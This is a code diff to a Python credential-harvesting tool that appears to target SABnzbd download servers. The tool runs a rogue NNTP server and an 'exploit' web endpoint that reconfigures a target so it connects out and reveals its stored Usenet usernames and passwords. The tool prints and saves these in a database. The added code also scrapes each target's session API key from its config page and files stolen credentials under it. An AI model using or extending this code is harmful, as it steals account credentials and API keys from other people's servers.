@@ -4,6 +4,7 @@ import sqlite3
 import threading
 from collections import defaultdict
 from json import JSONDecodeError
+from typing import Optional, Union
 
 import requests
 from aiohttp import web
@@ -32,6 +33,26 @@ SESSION.headers.update({
 routes = web.RouteTableDef()
 credentials = defaultdict(list)
 
+def get_sab_identifier(host: str, port: Optional[Union[int, str]] = None) -> str:
+    """
+    Identify a Host:Port by SAB Portal's API Key.
+
+    Falls back to the host if an error occurs.
+    """
+    if port:
+        hostname = f"{host}:{port}"
+    else:
+        hostname = host
+
+    try:
+        res = requests.get(f"http://{hostname}/config/general/")
+        identifier = re.search(r"var sabSession = '([^']+)';", res.text)
+        if identifier:
+            return identifier.group(1)
+    except Exception:
+        pass
+
+    return host
 
 def start_nntp_server(host: str, port: int) -> None:
     """
@@ -54,6 +75,10 @@ def start_nntp_server(host: str, port: int) -> None:
         password = None
 
         conn, addr = s.accept()
+        print(f"[+] [NNTP] Connection accepted from {addr}")
+        identifier = get_sab_identifier(addr[0], 8081)
+        print(f"  ∟ [NNTP] Portal identifier: {identifier}")
+
         with conn:
             # == Greeting: 200 Service available, posting allowed == #
             print(f"[+] [NNTP] Greeting client {addr}")
@@ -108,7 +133,7 @@ def start_nntp_server(host: str, port: int) -> None:
             print(f"  ∟ Username: {username}")
             print(f"  ∟ Password: {password}")
 
-            credentials[addr[0]].append({
+            credentials[identifier].append({
                 "username": username,
                 "password": password
             })
@@ -139,8 +164,10 @@ async def exploit(request: web.Request) -> web.Response:
         })
 
     print(f"[+] Targeting {target}")
+    identifier = get_sab_identifier(*target.split(":"))
+    print(f"  ∟ Portal identifier: {identifier}")
 
-    credentials[target.split(":")[0]].clear()
+    credentials[identifier].clear()
 
     try:
         server_settings = SESSION.get(
@@ -294,13 +321,13 @@ async def exploit(request: web.Request) -> web.Response:
         trigger_call, _ = test_server(NNTP_SERVER_PUBLIC_HOST, NNTP_SERVER_LOCAL_PORT)
         server["ssl"] = server_ssl_bak
 
-        credentials[target.split(":")[0]] = [
-            dict(**credential, **server)
-            for credential in credentials[target.split(":")[0]]
+        credentials[identifier] = [
+            credential | server
+            for credential in credentials[identifier]
         ]
 
     cursor = con.cursor()
-    for credential in credentials[target.split(":")[0]]:
+    for credential in credentials[identifier]:
         try:
             cursor.execute(
                 "INSERT INTO `credentials` (host, port, username, password, ssl) VALUES (?, ?, ?, ?, ?)",
@@ -322,7 +349,8 @@ async def exploit(request: web.Request) -> web.Response:
         "status": 200,
         "message": "Success",
         "target": target,
-        "credentials": credentials[target.split(":")[0]]
+        "identifier": identifier,
+        "credentials": credentials[identifier]
     })
 
 
